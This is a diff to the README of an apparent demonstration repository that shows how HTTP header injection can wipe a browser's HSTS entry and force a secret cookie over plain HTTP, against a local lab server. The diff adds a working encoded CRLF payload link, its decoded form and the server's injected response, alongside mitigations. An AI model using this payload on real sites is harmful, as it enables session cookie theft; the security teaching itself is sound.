@@ -10,6 +10,43 @@ A cookie without the secure-flag or other sensitive data, like the authorization
 
 This repository demonstrates the attack by supplying a vulnerable web server.
 
+### Payload
+
+In order to exploit the vulnerability, a victim must click a link of the following form:
+
+```
+https://hsts.local/vuln?param=value%0d%0aStrict-Transport-Security%3a+max-age%3d0%0d%0a%0d%0a<script>location=%22http://hsts.local/%3fcb%3d3401833577%22</script>
+```
+
+This decodes to:
+
+```
+value
+Strict-Transport-Security: max-age=0
+
+<script>location="http://hsts.local/?cb=3401833577"</script>
+```
+
+This value, including newline characters, is returned in the vulnerable header `X-Vulnerable-Header` of the server. The entire response looks like this:
+
+```http
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.3 Python/3.8.10
+Date: Sun, 19 Mar 2023 21:43:48 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 73
+X-Vulnerable-Header: param=value
+Strict-Transport-Security: max-age=0
+
+<script>location="http://hsts.local/?cb=3423821759"</script>
+Strict-Transport-Security: max-age=31536000
+Connection: close
+
+<html><head><title>Title</title></head><body>Just some HTML</body></html>
+```
+
+The cache buster is used to prevent browsers from returning cached responses.
+
 ### Mitigations
 
 * Prevent HTTP header injection by filtering new line characters.
@@ -97,12 +134,28 @@ Search the browser's settings for `cert` or follow these instructions:
    Also recognized that a secret cookie is returned in the server's response.
    ![Screenshot of the browser developer tools that show a 301 redirect](/images/01.png)
 
-4. Click `http://hsts.local?cb=...` with the cachebuster value to check whether HSTS is working.
-   The cachebuster is used to prevent browsers from returning cached responses.
+4. Click `http://hsts.local?cb=...` with the cache buster value to check whether HSTS is working.
    Chromium reports an internal redirect (307). Firefox only shows the HTTPS request.
    ![Screenshot of the browser developer tools that show a 307 redirect](/images/02.png)
 
 5. Click or copy&paste the *evil link*. It will inject an HSTS header with `max-age=0` to delete the HSTS entry. Afterwards it will redirect the user to `http://hsts.local?cb=...`
+   The final response of the webserver will look like this:
+   ```http hl_lines="6 7 8 9"
+   HTTP/1.1 200 OK
+   Server: Werkzeug/2.2.3 Python/3.8.10
+   Date: Sun, 19 Mar 2023 21:43:48 GMT
+   Content-Type: text/html; charset=utf-8
+   Content-Length: 73
+   X-Vulnerable-Header: param=value
+   Strict-Transport-Security: max-age=0
+
+   <script>location="http://hsts.local/?cb=3401833577"</script>
+   Strict-Transport-Security: max-age=31536000
+   Connection: close
+
+   <html><head><title>Title</title></head><body>Just some HTML</body></html>
+   ```
+
    Note that an HTTP request is sent via HTTP that contains the secret cookie.
    ![Screenshot of the browser developer tools that show a 301 redirect again](/images/03.png)
    ![Screenshot of the browser developer tools that shows the secret cookie in the HTTP request](/images/04.png)
